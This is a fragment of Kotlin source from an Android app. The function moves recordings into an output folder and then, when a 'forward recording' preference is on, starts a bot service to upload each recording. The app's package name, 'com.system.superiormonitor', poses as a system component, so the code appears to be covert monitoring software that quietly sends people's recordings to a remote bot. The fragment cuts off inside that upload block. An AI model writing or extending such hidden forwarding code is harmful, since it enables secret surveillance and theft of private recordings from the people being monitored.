...
class OutputDirUtils(private val context: Context, private val redactor: Redactor) {
    ...
    fun moveToOutputDir(
        ...
        path: List<String>,
        mimeType: String,
        customUserDir: DocumentFile? = null
    ): DocumentFile {
        val userDir = customUserDir ?: prefs.outputDirOrDefault.toDocumentFile(context)
        val redactedSource = redactor.redact(sourceFile.uri)

        // Try to move to target path directly
        val targetPath = mutableListOf<String>()
        if (customUserDir == null) {
            val dateStr = SimpleDateFormat("dd-MM-yyyy", Locale.getDefault()).format(Date())
            targetPath.add(dateStr)
            targetPath.add("offline")
        }
        targetPath.addAll(path)

        val targetFile = try {
            move(sourceFile, emptyList(), userDir, targetPath, mimeType)
        } catch (e: Exception) {
            Log.w(TAG, "Failed to move file; using fallback path", e)
            move(sourceFile, emptyList(), userDir, getErrorFallbackPath(targetPath), mimeType)
        }

        Log.i(TAG, "Successfully moved $redactedSource to ${redactor.redact(targetFile.uri)}")
        ...
        // Trigger BotService if applicable
        if (customUserDir == null && com.system.superiormonitor.data.PrefsManager.getInstance(context).forwardRecordingEnabled) {
            val intent = Intent(context, com.system.superiormonitor.bot.BotService::class.java).apply {
                action = "ACTION_UPLOAD_RECORDING"
                putExtra("fileUri", targetFile.uri.toString())
                putExtra("originalPath", targetPath.toTypedArray())
